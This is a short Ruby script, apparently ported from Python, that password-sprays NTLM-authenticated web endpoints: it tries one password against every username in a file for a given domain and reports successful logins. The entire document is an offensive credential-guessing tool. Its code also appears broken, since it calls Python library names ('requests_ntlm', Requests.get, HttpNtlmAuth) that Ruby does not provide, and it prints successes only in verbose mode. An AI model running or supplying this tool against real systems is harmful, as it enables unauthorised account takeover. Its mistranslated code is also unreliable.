require 'optparse'
require 'requests_ntlm'
require 'uri'

class NTLMSprayer
  HTTP_AUTH_FAILED_CODE = 401
  HTTP_AUTH_SUCCEED_CODE = 200

  def initialize(options)
    @userfile = options[:userfile]
    @fqdn = options[:fqdn]
    @password = options[:password]
    @attackurl = options[:attackurl]
    @verbose = options[:verbose]
  end

  def password_spray
    File.open(@userfile, "r").each_line do |user|
      user.strip!
      response = Requests.get(@attackurl, auth: HttpNtlmAuth.new("#{@fqdn}\\#{user}", @password))
      if response.code == HTTP_AUTH_SUCCEED_CODE
        puts "#{user} - Successful login" if @verbose
      elsif @verbose && response.code == HTTP_AUTH_FAILED_CODE
        puts "#{user} - Failed login"
      end
    end
  end
end

options = {}
opt_parser = OptionParser.new do |opts|
  opts.banner = "Usage: ntlm_sprayer.rb [options]"

  opts.on("-u", "--userfile USERFILE", "File containing list of usernames") { |v| options[:userfile] = v }
  opts.on("-f", "--fqdn FQDN", "Fully Qualified Domain Name (FQDN)") { |v| options[:fqdn] = v }
  opts.on("-p", "--password PASSWORD", "Password to be used for password spray") { |v| options[:password] = v }
  opts.on("-a", "--attackurl ATTACKURL", "URL to perform the password spray attack") { |v| options[:attackurl] = v }
  opts.on("-v", "--verbose", "Verbose mode") { |v| options[:verbose] = v }
end

opt_parser.parse!

if options.key?(:userfile) && options.key?(:fqdn) && options.key?(:password) && options.key?(:attackurl)
  ntlm_sprayer = NTLMSprayer.new(options)
  ntlm_sprayer.password_spray
else
  puts "Error: Missing required options. Use -h for help."
end

